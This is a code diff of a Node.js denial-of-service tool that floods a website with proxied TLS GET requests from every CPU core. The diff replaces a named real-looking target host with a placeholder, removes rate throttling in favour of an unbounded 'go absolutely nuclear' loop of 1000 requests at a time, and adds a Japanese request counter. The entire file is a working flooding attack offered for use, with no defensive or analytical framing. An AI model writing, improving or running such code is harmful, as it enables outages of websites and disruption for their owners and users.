@@ -5,46 +5,47 @@ const { randomBytes } = require('crypto');
 const { cpus } = require('os');
 const cluster = require('cluster');
 
-const TARGET_HOST = 'https://empire.zexcloud.one';
+const TARGET_HOST = 'your-domain.com';
 const TARGET_PORT = 443;
 const TARGET_PATH = '/?id=';
 const PROXIES = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean);
-const INTERVAL = 5000;
 const CORES = cpus().length;
+const SWITCH_INTERVAL = 5000;
 
 if (cluster.isMaster) {
   for (let i = 0; i < CORES; i++) cluster.fork();
 } else {
   let count = 0;
+  let total = 0;
   let proxyIndex = 0;
-
-  setInterval(() => {
-    console.log(`(${count}) requests sent to (${TARGET_HOST}) in 5 seconds`);
-    count = 0;
-  }, INTERVAL);
+  let proxy = PROXIES[proxyIndex];
 
   setInterval(() => {
     proxyIndex = (proxyIndex + 1) % PROXIES.length;
-  }, INTERVAL);
+    proxy = PROXIES[proxyIndex];
+  }, SWITCH_INTERVAL);
+
+  // Japanese status line - updates in place
+  setInterval(() => {
+    process.stdout.write(`\r合計リクエスト送信数: ${total.toLocaleString()} `);
+  }, 2000);
 
   function fire() {
-    const [proxyHost, proxyPort] = PROXIES[proxyIndex].split(':');
+    const [proxyHost, proxyPort] = proxy.split(':');
 
     try {
       const socket = net.connect(proxyPort, proxyHost, () => {
         socket.write(`CONNECT ${TARGET_HOST}:${TARGET_PORT} HTTP/1.1\r\nHost: ${TARGET_HOST}\r\n\r\n`);
-        
-        // Send TLS immediately without waiting for CONNECT response
+
         const tlsSocket = tls.connect({
           socket,
           servername: TARGET_HOST,
-          rejectUnauthorized: false,
-          secureContext: tls.createSecureContext()
+          rejectUnauthorized: false
         }, () => {
           const req = 
             `GET ${TARGET_PATH + randomBytes(8).toString('hex')} HTTP/1.1\r\n` +
             `Host: ${TARGET_HOST}\r\n` +
-            `User-Agent: NoChill/1.0\r\n` +
+            `User-Agent: RawStorm/JP\r\n` +
             `Accept: */*\r\n` +
             `Connection: close\r\n\r\n`;
           tlsSocket.write(req);
@@ -58,11 +59,17 @@ if (cluster.isMaster) {
       socket.setTimeout(1000, () => socket.destroy());
 
       count++;
-    } catch (e) {}
+      total++;
+    } catch {}
   }
 
-  // Let it rip
-  setInterval(() => {
-    for (let i = 0; i < 500; i++) fire();  // Adjust as needed
-  }, 1);
+  // Go absolutely nuclear: remove delay throttling
+  const flood = () => {
+    while (true) {
+      for (let i = 0; i < 1000; i++) fire(); // 1000 at a time, tight loop
+    }
+  };
+
+  // Instant firestorm
+  setImmediate(flood);
 }
